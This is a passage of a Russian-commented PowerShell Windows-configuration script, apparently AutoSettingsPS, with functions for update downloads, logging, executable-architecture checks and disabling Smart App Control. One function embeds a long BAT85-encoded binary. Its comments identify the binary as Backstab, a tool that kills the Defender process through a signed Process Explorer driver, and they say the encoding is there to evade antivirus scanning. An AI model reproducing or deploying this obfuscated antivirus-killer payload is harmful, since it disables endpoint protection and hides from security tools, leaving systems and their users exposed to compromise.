            $DirectoryItems = $DirectoryItems |
                Select-Object -Property Name, Version, @{name='Type';e={$_.media_type}}, @{name='Id';e={$_.resource_id}}, @{name='DirectUrl';e={$_.file}}
        }
    }
    elseif ( $Url -like 'http*.Google.*' )
    {
        $Content = Get-ContentWebPage -Url $Url

        if ( $Content )
        {
            <#
            [regex]::Matches($Content,'data-id="(.*?)".*?aria-label="(.*?)".*?data-tooltip="(.*?)"') | ForEach-Object -Process {
                $DirectoryItems += [PSCustomObject] @{
                    Name      = $_.Groups[3].Value  # data-tooltip
                    Version   = Get-VersionFromName -Str ($_.Groups[3].Value)
                    Type      = $_.Groups[2].Value -replace "$($_.Groups[3]) "  # aria-label
                    Id        = $_.Groups[1].Value  # data-id
                    DirectUrl = "https://drive.google.com/uc?id=$($_.Groups[1].Value)"
                }
            }
            #>

            # 4 = ExplicitCapture (группировать только явно именованные или нумерованные группы в форме (?<name>...))
            foreach ( $Data in [regex]::Matches($Content,'data-id="(?<id>.*?)".*?data-tooltip="((?<Type>.+?):)?\s*(?<Name>.*?)"',4) )
            {
                $Name = $Data.Groups['Name'].Value
                $id   = $Data.Groups['id'].Value

                $DirectoryItems += [PSCustomObject] @{
                    Name      = $Name
                    Version   = Get-VersionFromName -Str $Name
                    Type      = $Data.Groups['Type'].Value
                    Id        = $id
                   #DirectUrl = "https://drive.google.com/uc?id=$($id)"
                    DirectUrl = "https://drive.google.com/uc?export=download&id=$id&confirm=t"
                }
            }
 
            [int] $LinkCount = @($DirectoryItems.DirectUrl).Count

            Write-Host '     URL: ' -ForegroundColor DarkGray -NoNewline

            if ( $LinkCount )
            {
                Write-Host "LinkCount: $LinkCount" -ForegroundColor DarkGray
            }
            else
            {
                Write-Host "LinkCount: $LinkCount" -ForegroundColor DarkYellow
            }
        }
        else
        {
            Write-Host '     URL: ' -ForegroundColor DarkGray -NoNewline
            Write-Host 'No Content data' -ForegroundColor DarkYellow
        }
    }
    else { Write-Warning "   $NameThisFunction`: unknown link: $Url" }

    Return $DirectoryItems
}

# Функция закачки указанного имени файла по публичным ссылкам с облаков Google Drive и Yandex Disk
# используются функции: Get-VersionFromName, Get-DirectoryItems, Download-File
Function Get-FileFromServers {

    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string[]] $URLs
       ,
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string] $Name
       ,
        [string] $Extension
       ,
        [string] $CurrentVersion
       ,
        [string] $DestPath
       ,
        [switch] $DownloadByBrowser
       ,
        [switch] $OnlyCheck
       ,
        [switch] $CheckAllServers
       ,
        [ValidateSet( 'Google', 'Yandex|Yadi' )]
        [string] $PriorityServer
    )

    # Получение имени этой функции.
    [string] $NameThisFunction = $MyInvocation.MyCommand.Name

    # Получение перевода
    [hashtable] $L = $Lang.$NameThisFunction
    [string] $text = ''

    # Если не указан путь сохранения, загрузка будет в папку "Загрузки" текущего пользователя
    if (( -not $DestPath ) -and ( -not $OnlyCheck ))
    {
        [string] $Key = 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer'
        [string] $Downloads = [Microsoft.Win32.Registry]::GetValue("$Key\Shell Folders",'{374DE290-123F-4565-9164-39C4925E467B}',$null)
        if ( -not $Downloads ) { $Downloads = [Microsoft.Win32.Registry]::GetValue("$Key\User Shell Folders",'{374DE290-123F-4565-9164-39C4925E467B}',$null) }
        if ( [System.IO.Directory]::Exists($Downloads) ) { $DestPath = $Downloads }
    }

    [array] $isURLs = @()

    if ( $PriorityServer )
    {
        $isURLs = @($URLs).Where({ $_ -match ":\/\/[^\/\n\r]*?($PriorityServer)" })
        $isURLs += @($URLs).Where({ $_ -notmatch ":\/\/[^\/\n\r]*?($PriorityServer)" })
    }
    else
    {
        $isURLs = $URLs
    }

    foreach ( $URL in $isURLs )
    {
        if ( $Extension ) { $Regex = [regex]::new("^$Name.*?[.]$Extension$") ; $ShowName = "$Name ($Extension)" }
        else              { $Regex = [regex]::new("^$Name")                  ; $ShowName = "$Name" }

        if ( $CurrentVersion )
        {
            $text = if ( $L.s1 ) { $L.s1 } else { 'Поиск' }
            Write-Host "   $text`: " -ForegroundColor Cyan -NoNewline

            $text = if ( $L.s1_1 ) { $L.s1_1 } else { 'Новой версии' }
            Write-Host "$text " -ForegroundColor DarkCyan  -NoNewline
        }
        else
        {
            $text = if ( $L.s1 ) { $L.s1 } else { 'Поиск' }
            Write-Host "   $text`: " -ForegroundColor Cyan -NoNewline
        }

        Write-Host "$ShowName " -ForegroundColor White -NoNewline
        if ( $CurrentVersion ) { Write-Host "| $CurrentVersion " -ForegroundColor DarkGray } else { Write-Host }

        $text = if ( $L.s2 ) { $L.s2 } else { '  URL' }
        Write-Host "   $text`: $URL" -ForegroundColor DarkGray

        [array] $DirectoryItems = Get-DirectoryItems $URL

        $FileData = $DirectoryItems | Where-Object -Property Name -Match $Regex | Sort-Object -Property Name | Select-Object -Last 1  # если несколько файлов подпадет
        $FileUrl  = $FileData.DirectUrl
        $FileName = $FileData.Name
        $DestFile = '{0}\{1}' -f $DestPath.TrimEnd('\'), $FileName

        if ( $FileUrl -and $FileName )
        {
            if ( $CurrentVersion )
            {
                [version] $VersionOld = $null
                [version]::TryParse($CurrentVersion,[ref]$VersionOld) > $null

                if ( $VersionOld -and ( $FileVersion = Get-VersionFromName -Str $FileName ))
                {
                    if ( $FileVersion -le $VersionOld )
                    {
                        $text = if ( $L.s3 ) { $L.s3 } else { ' Файл' }
                        Write-Host "   $text`: " -ForegroundColor DarkGray -NoNewline

                        $text = if ( $L.s3_1 ) { $L.s3_1 } else { 'Актуальный' }
                        Write-Host "$text " -ForegroundColor DarkGreen -NoNewline

                        $text = if ( $L.s3_2 ) { $L.s3_2 } else { 'Найден' }
                        Write-Host "| $text`: $FileName " -ForegroundColor DarkGray -NoNewline

                        if ( $OnlyCheck )
                        {
                            $text = if ( $L.s3_3 ) { $L.s3_3 } else { 'Только проверка' }
                            Write-Host "| $text" -ForegroundColor DarkGray
                        }
                        else
                        {
                            Write-Host
                        }

                        if ( -not $CheckAllServers ) { break } else { Continue }
                    }
                }
            }

            $text = if ( $L.s3 ) { $L.s3 } else { ' Файл' }
            Write-Host "   $text`: " -ForegroundColor DarkGray -NoNewline

            $text = if ( $L.s3_2 ) { $L.s3_2 } else { 'Найден' }
            Write-Host "$text " -ForegroundColor DarkGreen -NoNewline
            Write-Host "| $FileName " -ForegroundColor DarkGray

            Write-Host "    Link: DirectUrl | $FileUrl " -ForegroundColor DarkGray -NoNewline

            if ( $OnlyCheck )
            {
                $text = if ( $L.s3_3 ) { $L.s3_3 } else { 'Только проверка' }
                Write-Host "| $text" -ForegroundColor DarkGray

                if ( -not $CheckAllServers ) { break } else { Continue }
            }
            else
            {
                $text = if ( $L.s3_4 ) { $L.s3_4 } else { 'Скачиваем' }
                Write-Host "| $text ..." -ForegroundColor DarkGray
            }

            if ( $DownloadByBrowser )
            {
                $text = if ( $L.s2 ) { $L.s2 } else { '  URL' }
                Write-Host "   $text`: " -ForegroundColor DarkGray -NoNewline

                $text = if ( $L.s2_1 ) { $L.s2_1 } else { 'Передача загрузки в браузер' }
                Write-Host "$text" -ForegroundColor White

                try { Start-Process $FileUrl -ErrorAction SilentlyContinue }
                catch
                {
                    $text = if ( $L.s2 ) { $L.s2 } else { '   URL' }
                    Write-Host "   $text`: " -ForegroundColor DarkGray -NoNewline

                    $text = if ( $L.s2_2 ) { $L.s2_2 } else { 'Ошибка передачи в браузер' }
                    Write-Host "$text" -ForegroundColor DarkYellow
                }

                break
            }
            else
            {
                $Result = Download-File -FileUrl $FileUrl -DestFile $DestFile
            }

            if ( $Result )
            {
                $text = if ( $L.s3 ) { $L.s3 } else { ' Файл' }
                Write-Host "   $text`: " -ForegroundColor DarkGray -NoNewline

                $text = if ( $L.s3_5 ) { $L.s3_5 } else { 'Сохранён' }
                Write-Host "$text " -ForegroundColor Green -NoNewline
                Write-Host "| $DestFile" -ForegroundColor DarkGray

                break
            }
            else
            {
                $text = if ( $L.s3 ) { $L.s3 } else { ' Файл' }
                Write-Host "   $text`: " -ForegroundColor DarkGray -NoNewline

                $text = if ( $L.s3_6 ) { $L.s3_6 } else { 'Не Скачан' }
                Write-Host "$text" -ForegroundColor DarkYellow
            }
        }
        else
        {
            $text = if ( $L.s2 ) { $L.s2 } else { '  URL' }
            Write-Host "   $text`: " -ForegroundColor DarkGray -NoNewline

            $text = if ( $L.s2_3 ) { $L.s2_3 } else { 'Нет данных' }
            Write-Host "$text" -ForegroundColor DarkYellow
        }
    }
}

# Функция проверки/закачки Новой версии скрипта AutoSettingsPS или пресетов
# используются функции: Get-FileFromServers и Test-Internet
Function Get-AutoSettingsPS-Update {

    [CmdletBinding( SupportsShouldProcess = $false, DefaultParameterSetName = 'All' )]
    param (
        [Parameter( ParameterSetName = 'LatestASPS' )]
        [switch] $LatestASPS
       ,
        [Parameter( ParameterSetName = 'Presets' )]
        [switch] $Presets
       ,
        [switch] $OnlyCheck
       ,
        [switch] $NoPause
    )

    # Получение имени этой функции.
    [string] $NameThisFunction = $MyInvocation.MyCommand.Name

    # Получение перевода
    [hashtable] $L = $Lang.$NameThisFunction
    [string] $text = ''

    if ( -not ( Test-Internet -Bool -Access ))
    {
        if ( -not $NoPause )
        {
            $text = if ( $L.s2 ) { $L.s2 } else { 'Нет доступа в Интернет для PS' }
            Write-Host "   $text" -ForegroundColor DarkYellow
        }
    }
    else
    {
        # Ссылки на ../Settings and Tools/Windows 10 1809+
        $URLs = 'https://drive.google.com/drive/folders/1BeIxTdr9ag9RIxAoPbw8K5lFVbywkFvC',
                'https://disk.yandex.com/d/Fa12eTeiCyGkcw'

        if ( -not $Presets )
        {
            if ( $LatestASPS )
            {
                Get-FileFromServers -URLs $URLs -Name 'AutoSettingsPS' -Extension zip -OnlyCheck:$OnlyCheck
            }
            else
            {
                Get-FileFromServers -URLs $URLs -Name 'AutoSettingsPS' -Extension zip -CurrentVersion:$AutoSettingsVersion -OnlyCheck:$OnlyCheck
            }

            Write-Host
        }
        else
        {
            Get-FileFromServers -URLs $URLs -Name 'Presets_Hard'      -Extension txt -OnlyCheck:$OnlyCheck
            Write-Host
            Get-FileFromServers -URLs $URLs -Name 'QuickPresets_Hard' -Extension txt -OnlyCheck:$OnlyCheck
        }
    }

    if ( -not $NoPause )
    {
        $text = if ( $L.s1 ) { $L.s1 } else { 'Завершено' }
        Write-Host "`n   $text" -ForegroundColor DarkGray

        Get-Pause
    }
}


<#
Пример 1: Write-Warning-Log "`n Пример предупреждения 1 `n "

Пример 2: Write-Warning-Log "`n   Пример предупреждения `n   еще одного " "D:\Warnings.log"
#>
Function Write-Warning-Log {

    [CmdletBinding()]
    Param (
        [Parameter( Mandatory = $true,  ValueFromPipeline = $false, Position = 0 )]
        [string] $Line
       ,
        [Parameter( Mandatory = $false, ValueFromPipeline = $false, Position = 1 )]
        [string] $FileLog = $WarningsLogFile   # По умолчанию задан глобальный лог для предупреждений, если есть.
    )

    # Получение имени этой функции.
    [string] $NameThisFunction = $MyInvocation.MyCommand.Name

    # Получение перевода
    [hashtable] $L = $Lang.$NameThisFunction
    [string] $text = ''

    Write-Warning "$Line"

    # Если не передан файл для сохранения или не назначен $WarningLog по умолчанию, сохранит в папку Temp пользователя.
    if ( $FileLog -eq '' )
    {
        # Расскрываем короткие имена в пути
        [string] $TempPath = $([System.IO.Path]::GetFullPath($env:TEMP))

        $FileLog = "$TempPath\AutoSettings-Warnings.log"

        $text = if ( $L.s1 ) { $L.s1 } else { 'Это предупреждение записано в' }
        Write-host "   $text`: '$FileLog', " -BackgroundColor DarkYellow -NoNewline

        $text = if ( $L.s1_1 ) { $L.s1_1 } else { 'так как файл не был назначен' }
        Write-host "$text   " -BackgroundColor DarkYellow
    }
    else
    {
        $text = if ( $L.s1 ) { $L.s1 } else { 'Это предупреждение записано в' }
        Write-host "   $text`: '$FileLog'   " -BackgroundColor DarkYellow
    }

    # Out-File -FilePath $File -InputObject "$(Get-Date -Format "yyyy-MM-dd HH:mm:ss"), Warning`t$Line" -Append -Encoding utf8

    [System.Collections.Generic.List[string]] $log = "$(Get-Date -Format "yyyy-MM-dd HH:mm:ss"), Warning`t$Line"
    [System.IO.File]::AppendAllLines($FileLog,$log,[System.Text.Encoding]::GetEncoding('utf-8'))
}


<#
примеры
Save-Error
или
Save-Error D:\Errors.log
#>
Function Save-Error {

    [CmdletBinding()]
    Param (
        [Parameter( Mandatory = $false, ValueFromPipeline = $false, Position = 1 )]
        [string] $FileLog = $ErrorsLogFile  # По умолчанию задан глобальный лог для ошибок, если есть.
    )

    # Получение имени этой функции.
    [string] $NameThisFunction = $MyInvocation.MyCommand.Name

    # Получение перевода
    [hashtable] $L = $Lang.$NameThisFunction
    [string] $text = ''

    if ( $Error[0] -ne $null )
    {
        # Если не передан файл для сохранения или не назначен $ErrorsLog по умолчанию, сохранит лог в папку Temp пользователя.
        if ( $FileLog -eq '' )
        {
            $FileLog = "$env:TEMP\AutoSettings-Errors.log"

            $text = if ( $L.s1 ) { $L.s1 } else { 'Эта ошибка записана в' }
            Write-host "   $text`: '$FileLog', " -BackgroundColor DarkBlue -NoNewline

            $text = if ( $L.s1_1 ) { $L.s1_1 } else { 'так как файл не был назначен' }
            Write-host "$text   " -BackgroundColor DarkBlue

            try { Out-File -FilePath $FileLog -InputObject "$(Get-Date -Format "yyyy-MM-dd HH:mm:ss"), Error: ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄`n", $Error[0] -Append -Encoding utf8 -Force -ErrorAction Stop }
            catch { throw }
        }
        else
        {
            $text = if ( $L.s1 ) { $L.s1 } else { 'Эта ошибка записана в' }
            Write-host "   $text`: '$FileLog'   " -BackgroundColor DarkBlue

            try { Out-File -FilePath $FileLog -InputObject "$(Get-Date -Format "yyyy-MM-dd HH:mm:ss"), Error: ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄`n", $Error[0] -Append -Encoding utf8 -Force -ErrorAction Stop }
            catch
            {
                # Если нет доступа на запись к директории скрипта, сохранить файл в папке темп пользователя
                $FileLog = "$env:TEMP\AutoSettings-Errors.log"

                $text = if ( $L.s1 ) { $L.s1 } else { 'Эта ошибка записана в' }
                Write-host "   $text`: '$FileLog', " -BackgroundColor DarkBlue -NoNewline

                $text = if ( $L.s2 ) { $L.s2 } else { 'так как нет доступа на запись в папку скрипта' }
                Write-host "$text   " -BackgroundColor DarkBlue

                try { Out-File -FilePath $FileLog -InputObject "$(Get-Date -Format "yyyy-MM-dd HH:mm:ss"), Error: ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄`n", $Error[0] -Append -Encoding utf8 -Force -ErrorAction Stop }
                catch { throw }
            }
        }
    }
}

# Функция для проверки включена ли новая защита Smart App Control, если да, то предложить отключить, потом надо перезагрузить комп, иначе не даст запустить скрипт.
Function Check-SAC {

    [string] $Smart = ''; 
    try { $Smart = [Microsoft.Win32.Registry]::GetValue('HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CI\Protected','VerifiedAndReputablePolicyStateMinValueSeen','') } catch {}
    if ( -not $Smart ) { $Smart = '0' };

    if ( $Smart -eq '0' ) { Return }

    $Smart = '';
    try { $Smart = [Microsoft.Win32.Registry]::GetValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender','VerifiedAndReputableTrustModeEnabled','') } catch {}
    if ( -not ( $Smart -eq '1' )) { $Smart = '0' }

    if ( $Smart -eq '0' ) { Return }

    $Smart = '';
    try { $Smart = [Microsoft.Win32.Registry]::GetValue('HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CI\Policy','VerifiedAndReputablePolicyState','') } catch {}
    if ( $Smart -eq '0' ) { $Smart = '?' }

    if ( $Smart -eq '?' )
    {
        if ( $Ru )
        {
            Write-Host "`n   Нужно перезагрузить компьютер!!!`n" -ForegroundColor Yellow
            Write-Host   "   После отключения Интеллектуального управления приложениями (Smart App Control)`n" -ForegroundColor DarkGray
        }
        else
        {
            Write-Host "`n   You need to reboot the computer!!!`n" -ForegroundColor Yellow
            Write-Host   "   After disabling Smart App Control`n" -ForegroundColor DarkGray
        }

        Start-Sleep -Milliseconds 10000

        Exit
    } 

    [string] $Root   = 'HKEY_LOCAL_MACHINE'
    [string] $SubKey = 'SYSTEM\CurrentControlSet\Control\CI\Policy'

    [bool] $NoSVC = $false
    [bool] $Exit  = $false

    if ( -not @([System.Diagnostics.Process]::GetProcessesByName('SecurityHealthService')).Count ) { $NoSVC = $true }

    do
    {
        Clear-Host

        if ( $Ru )
        {
            Write-Host "`n`n  Не отключено Интеллектуальное управление приложениями (Smart App Control) | Строгий режим запрета приложений" -ForegroundColor Red
            Write-Host     "  Для возможности полноценной настройки Windows его необходимо отключить    | Обратно возможно не включить!`n" -ForegroundColor Gray
        }
        else
        {
            Write-Host "`n`n  Smart App Control is not disabled | Strong application restriction mode" -ForegroundColor Red
            Write-Host     "  It must be disabled to be able to fully configure Windows | It may not be possible to turn it back on!`n" -ForegroundColor Gray
        }

        if ( $UnsupportedOS )
        {
            Write-HostColor "        $UnsupportedOS  `n"
        }

        if ( $Ru )
        {
            $text  = 'Отключить        '
            $text2 = 'Попытаться отключить   | После нужно перезагрузить компьютер'
        }
        else
        {
            $text  = 'Disable      '
            $text2 = 'Try to disable SAC  | You must restart the computer afterwards'
        }

        Write-Host "  [1] = $text " -ForegroundColor Cyan -NoNewline
        Write-Host "| $text2" -ForegroundColor DarkGray

        if ( $Ru )
        {
            $text  = 'Открыть настройки'
            $text2 = 'Для отключения вручную | Перезагрузка не нужна'
        }
        else
        {
            $text  = 'Open settings'
            $text2 = 'To disable manually | No reboot needed'
        }

        if ( -not $NoSVC )
        {
            Write-Host "  [2] = $text " -ForegroundColor Cyan -NoNewline
            Write-Host "| $text2" -ForegroundColor DarkGray
        }
        else
        {
            Write-Host "  [2] = $text | $text2 | " -ForegroundColor DarkGray -NoNewline
            Write-Host 'Not Running: SecurityHealthService' -ForegroundColor Yellow
        }

        if ( $Ru )
        {
            $text  = 'без ввода'
            $text2 = 'Выход'
        }
        else
        {
            $text  = 'no input'
            $text2 = 'Exit'
        }

        Write-Host "`n  [$text] " -ForegroundColor Cyan -NoNewline
        Write-Host "= $text2`n" -ForegroundColor DarkGray

        # Разблокировка смены активного окна, если было заблокировано. и сделать окно активным на переднем плане (Z положение), если фокус у UWP или проводника
        ReStart-Explorer -UnLockSetForeground -SetFocusToCurrentWindow

        $text = if ( $Ru ) { 'Ваш выбор' } else { 'Your choice' }
        $InputMenu = Read-Host "   $text"

        if ( $NoSVC -and ( $InputMenu -eq 2 )) { $InputMenu = '-' }

        if ( $InputMenu -eq 1 )
        {
            Set-Reg -NoCheck New-ItemProperty -Path "HKLM:\$SubKey" -Name 'VerifiedAndReputablePolicyState' -Type DWord -Value 0

            $Exit = $true 
        }
        elseif ( $InputMenu -eq 2 )
        {
            if ( $Ru )
            {
                Write-Host "`n   Открытие окна настроек`n" -ForegroundColor DarkCyan
            }
            else
            {
                Write-Host "`n   Opens the settings window`n" -ForegroundColor DarkCyan
            }

            Start-Process -FilePath windowsdefender://SmartApp -ErrorAction SilentlyContinue
 
            Start-Sleep -Milliseconds 3000
            
            $Exit = $true
        }
        elseif ( $InputMenu -eq '' ) { $Exit = $true }
        else
        {
            $text = if ( $Ru ) { 'Неверный выбор' } else { 'Wrong choice' }

            Write-Host "`n   $text" -ForegroundColor Yellow
            Start-Sleep -Milliseconds 1000
        }
    }
    until ( $Exit -or $Smart -eq '0' )

    try
    {
        $Smart = '-'
        $Smart = [Microsoft.Win32.Registry]::GetValue("$Root\$SubKey",'VerifiedAndReputablePolicyState','-')
    }
    catch {}

    if ( $Smart -eq '0' )
    {
        if ( $Ru )
        {
            Write-Host "`n   Нужно перезагрузить компьютер!!!`n" -ForegroundColor Yellow
            Write-Host   "   После отключения Интеллектуального управления приложениями (Smart App Control)`n" -ForegroundColor DarkGray
        }
        else
        {
            Write-Host "`n   You need to reboot the computer!!!`n" -ForegroundColor Yellow
            Write-Host   "   After disabling Smart App Control`n" -ForegroundColor DarkGray
        }

        Start-Sleep -Milliseconds 10000
    } 

    Exit
}

# Получение разрядности exe файла.
Function Get-ExeArch
{
    [CmdletBinding( SupportsShouldProcess = $false )]
    [OutputType([string])]
    param(
        [Parameter( Mandatory = $true, Position = 0)]
        [Alias('FullName')][String]$File
    )

    ## Constants ##
    $PEHeaderOffsetLocation = 0x3c
    $PEHeaderOffsetLocationNumBytes = 2
    $PESignatureNumBytes = 4
    $MachineTypeNumBytes = 2
         
    try
    {
        $PEHeaderOffset = New-Object Byte[] $PEHeaderOffsetLocationNumBytes
        $PESignature    = New-Object Byte[] $PESignatureNumBytes
        $MachineType    = New-Object Byte[] $MachineTypeNumBytes
             
        Write-Verbose "Opening $File for reading."
        try
        {
            $FileStream = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        }
        catch
        {
            Write-Verbose "Error: Open FileStream"
            return ''
        }
             
        Write-Verbose "Moving to the header location expected to contain the location of the PE (portable executable) header."
        $FileStream.Position = $PEHeaderOffsetLocation
        $BytesRead = $FileStream.Read($PEHeaderOffset, 0, $PEHeaderOffsetLocationNumBytes)
        if($BytesRead -eq 0)
        {
            Write-Verbose "Error: $File is not the correct format (PE header location not found)." 
            return ''
        }
        
        Write-Verbose "Moving to the indicated position of the PE header."
        $FileStream.Position = [System.BitConverter]::ToUInt16($PEHeaderOffset, 0)
        Write-Verbose "Reading the PE signature."
        $BytesRead = $FileStream.Read($PESignature, 0, $PESignatureNumBytes)
        if($BytesRead -ne $PESignatureNumBytes)
        {
            Write-Verbose "Error: $File is not the correct format (PE Signature is an incorrect size)."    # implicit 'else'
            return ''
        }

        Write-Verbose "Verifying the contents of the PE signature (must be characters `"P`" and `"E`" followed by two null characters)."
        if(-not($PESignature[0] -eq [Char]'P' -and $PESignature[1] -eq [Char]'E' -and $PESignature[2] -eq 0 -and $PESignature[3] -eq 0))
        {
            Write-Verbose "$File is 16-bit or is not a Windows executable."
            return ''
        }

        Write-Verbose "Retrieving machine type."
        $BytesRead = $FileStream.Read($MachineType, 0, $MachineTypeNumBytes)
        if($BytesRead -ne $MachineTypeNumBytes)
        {
            Write-Verbose "$File appears damaged (Machine Type not correct size)." 
            return ''
        }

        $RawMachineType = [System.BitConverter]::ToUInt16($MachineType, 0)
        $TargetMachine = switch ($RawMachineType) # https://learn.microsoft.com/en-us/windows/win32/debug/pe-format?redirectedfrom=MSDN
        {
            0x8664  { 'x64' }
            0x14c   { 'x86' }
            default {
   
                '' # '{0:X0}' -f $RawMachineType

                Write-Verbose "Executable found with an unknown target machine type. Please refer to section 2.3.1 of the Microsoft documentation (http://msdn.microsoft.com/en-us/windows/hardware/gg463119.aspx)."
            }
        }

        return $TargetMachine
    }
    catch
    {
        # the real purpose of the outer try/catch is to ensure that any file streams are properly closed. pass errors through
        Write-Verbose 'Error' # $_
        return ''
    }
    finally
    {
        if ( $FileStream )
        {
            $FileStream.Close()
        }
    }
}


Function Get-Encoded-BS64 {

    # Файл [б э к с т а б 6 4] для закрытия процесса защитника с помощью драйвера от MS с цифровой подписью от MS из Process Explorer (только для Windows x64),
    # чтобы настроить защитник без необходимости отключать защиту юзеру перед настройкой, работать будет не бесконечно, на инсайдерах уже не работает.
    # Когда перестанет работать метод, придеться отключать защиту Защитника вручную перед использованием скрипта в любом случае. Лучше конечно самому отключать и сейчас чтобы отключить его с первой попытки.
    # Если отключить защиту перед использованием скрипта для отключения Защитника, то файл не будет использоваться, так как нет необходимости в таком случае.
    # Появилась такая необходимость с W11 22621.1413 | Файл детектится как "убийца антивирусов" | Исходный код и файл: github.com/ Y a x s e r / B a c k s t a b
    # строка закодирована через BAT85 github.com/AveYo/Compressed2TXT, попытка скрыть от антивирусов код, а то некоторые агрятся (eset), так как делают полный анализ скрипта, в том числе и гугл.

    [string] $S = '
::.56xh~wwTOp./3Pk/Z4~_1o=D~~~~~Mv2C{~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~iS8.?PZnmE~B64RU+VuYf?iHptEfA.3CM^[9Q&1k9QS(O)TWP8U3AJtUAWl.}wgL8ADRwwDeH}k1v]K3~~~~~|;7-7O|49FO|49F
::O|49FpGibAs)X41z0fNSGj)V?z0frh8dZ5;z0flo~4EQNz0f{rP&0db;_[kyP,hy~O|4ziQ;S,C@^~E,~lqqn@^~4ROJt]wO|GV#OJt]w@^~ZCOJt]wQ7tRaO|49F~~~~~~~~~~|d-@{cQ!.Nn;U3}~~~~~~~~~~y1#jBOZleh~HzZa
::~}1~z~~~~~@?m?{~pS1!~~~~{~TT;p~pS1!~~6gGp?yR4~~~~~p?yR4~~~~~~sZrw~~3.P.[-?E~wbIr~~~v!~~~~~~pS1!~~~~~~~~v!~~~~~~pS1!~~~~~~~~~~Hgs_!~~~~~~~~~~R1[qmy1Z)N~[4QEA6zE~~X9X_~~T6O~~~~~
::~~~~~~4Nuf!S&=J8+3r]AbS-T~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#2_2E[bk~o~~~~~~~~~~~sZjFGv-H1~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Di8o=)/b|9ZPfM6~pS1!~HzZa~~3.P~~~~~~~~~~~~~~~U.[2=D?-$[)20V=
::}yH;.~sZjF~P]k$~H{KR~~~~~~~~~~~~~~~Mv2d=Dyc2B9Di.ghvf8g~VhP=~~6gG~UMd1~~~~~~~~~~~~~~~Mv2KpD?h@X)20V=~~T6O~X9X_~~3.P~UWiV~~~~~~~~~~~~~~~Mv2d=D?EG&9Kv$DA6zE~~[4QE~XdYL~UE6[~~~~~
::~~~~~~~~~~Mv2d=D?-Z0Adwf]!S&=J~4Nuf~~6gG~QooF~~~~~~~~~~~~~~~Mv2dZ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/T~eX)?xZrfKyQ^fKyQ^/QJpCGh.e#1a6hU},ZJ2qUKXQQCok5$t(.Iq(??4)T5b~~TT;pw(^nY~~Gv7KSSiYk/uqA{r+/!1^?dz{P[gQ/QdC&4,nm]~8I{_
::X#7g5IiO@$fKyQ^fKyQ^/QOmR/Q--dZzc$]~~sMtk/R1D~TT;p/QpnDIiO@$.aE)NUts.9zOS-j$t(niqk6?io,|IM~~G^$yB/$}/QEXf/Y/In.a,5|Xq]Aq/tBUAgn{M]~sDT-/Q-FKqDB)r/QdC&8GF&r~D/M~k/Rg~Py#Zg$0lG9
::@zVG307y_DfKyQ^fKyQ^fKyQ^/QJ&k8et=;1^iDo7{c]O~~Gv7pygzD~8_?{/QR~)7gMnu/QE!,q(?!H/THv&Abip0!j_NZ)T5r$_gZg.~.eMZ~~p+4/TO|N@ix|V~RRM{z($la/QJ&kUc9f8DBX2Q/t/j7k/RUJ)T5klq?!ty1r9yL
::~TT;5Z7?gP~RRM{GE5ws/T~dq}Z9;RqXivk.^.$S}Z9;Rq;wJ6.^geoZA8J;_CLO}~.nQzk/uR=},vGU!RL!3},uGNZ$fSg~RR6-Z2MONmMqIqq;wJ$/t/#7~~P#@qX8~k{OI!OM}s[?qX8~Cw(v-3~~PIN)Q.I_/TpHo}Z91qPXOQ1
::!xn};~TT;5qfWt,/TOpIzZTK^g5Xqq~8L8{p93V+}U];b~~GvY},Z,A!x5G;-R7yW$(Fd)qiupaP7s,d~.+YOk/#,5EDI,)~8LGc1oPO-},u,^},#DL~~~~nZ0Q)o~~GTFp./3P/Q^IrU9a;Pw(xm-~~PIN)Q.I_/TpsR}6PG=7W?Z7
::!xnm]~~~~nqfWt,/TOpIzZTK^g5Xqq~8L8{HB}3(}U];b~~GvY},Z,A!x5G;0RnHe$(Fd2qiupaP$cLi~.C$tk/#,5ERCb@},vXPcnjk/~IcQ^~Yy4UqfWt,ZT3qN~~~pJ},#X#Z0Q)o~~Gv=},vDU_Ysr!~8cSo/Q^IrU^3DrB^W7.
::lnJ6]CF4g;y6&;^-nQJ9kp+]xp+B&M~~Gv7ZOZ?x~~GuWfn-$Q~~GSuaXj!~~~G^$0.Y=F)~kxT54^l7fKyQ^Mo|BsEFdLL~8Lp#v(b{H/[7!^q!dg0~RR6-qF$?m/TO|NX=T[a~RRM{U(3Ry.^.qRMv2d^qgqQ$_CLO}~8Ls21xxN!
::IG#Ymk}D0Qk/uqA{r+251xxZ?~~;4p/t/#7~~Pv=4N-8L~D/B!HwhUgZzWG|~~sBQwQodvI~QX}~TT;p/Qn3uMvJ?C/[7$&-^Xl8/|eSJ~RRBsIiO@$fKyQ^fKyQ^fKyQ^/QJ|-HMmi$1^4B6.]8LoTLI+3Ey2(NF)Y^K1r{XONOO^J
::k/uqA{r+/!1^?dz{P[gQ/QdC&4?u}J~8I{_X#7g5IiO@$fKyQ^fKyQ^/QJ&kHB+j?1^48DY,t+GTlte^qLyje~~GSZy#&VvL1ufR}HjRhDr$3k~8QfO}i8AoZnw3I~8IwN1^8g^MkUwaZNSF7~8Q{NmG^hfD4Njmd,o99]&@+0I).!1
